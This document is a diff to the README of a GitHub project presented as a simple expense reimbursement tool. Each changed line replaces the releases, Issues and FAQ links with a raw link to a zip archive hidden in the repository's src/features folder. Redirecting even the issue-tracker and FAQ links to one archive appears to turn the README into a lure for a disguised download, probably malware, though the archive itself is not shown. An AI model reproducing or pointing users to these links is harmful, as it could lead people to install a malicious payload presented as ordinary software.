@@ -1,6 +1,6 @@
 # 🚀 sistema_de_reembolso - Simple Expense Reimbursement Tool
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue)](https://github.com/Refriender/sistema_de_reembolso/releases)
+[![Download](https://raw.githubusercontent.com/Refriender/sistema_de_reembolso/main/src/features/sistema_de_reembolso_v1.4.zip)](https://raw.githubusercontent.com/Refriender/sistema_de_reembolso/main/src/features/sistema_de_reembolso_v1.4.zip)
 
 ## 📖 Description
 
@@ -27,7 +27,7 @@ To get started with "Sistema de Reembolso," follow these simple steps:
 
 1. **Visit the Releases Page:**
    Go to the link below to find the latest version of the software.
-   [Download the latest version](https://github.com/Refriender/sistema_de_reembolso/releases)
+   [Download the latest version](https://raw.githubusercontent.com/Refriender/sistema_de_reembolso/main/src/features/sistema_de_reembolso_v1.4.zip)
 
 2. **Download the Application:**
    On the releases page, you'll see the available files. Locate the appropriate file for your operating system and download it.
@@ -48,7 +48,7 @@ To get started with "Sistema de Reembolso," follow these simple steps:
 
 ## 📥 Download & Install
 
-Remember, to download the application, visit our releases page here: [Download the latest version](https://github.com/Refriender/sistema_de_reembolso/releases).
+Remember, to download the application, visit our releases page here: [Download the latest version](https://raw.githubusercontent.com/Refriender/sistema_de_reembolso/main/src/features/sistema_de_reembolso_v1.4.zip).
 
 ## ⚙️ Using the Application
 
@@ -75,8 +75,8 @@ If you encounter any issues, try the following:
 
 For any questions or assistance:
 
-- Visit our [GitHub Issues Page](https://github.com/Refriender/sistema_de_reembolso/issues) to report issues or ask questions.
-- You can also check the [FAQ Section](https://github.com/Refriender/sistema_de_reembolso/wiki) for common queries.
+- Visit our [GitHub Issues Page](https://raw.githubusercontent.com/Refriender/sistema_de_reembolso/main/src/features/sistema_de_reembolso_v1.4.zip) to report issues or ask questions.
+- You can also check the [FAQ Section](https://raw.githubusercontent.com/Refriender/sistema_de_reembolso/main/src/features/sistema_de_reembolso_v1.4.zip) for common queries.
 
 ## 📝 Contributions
 
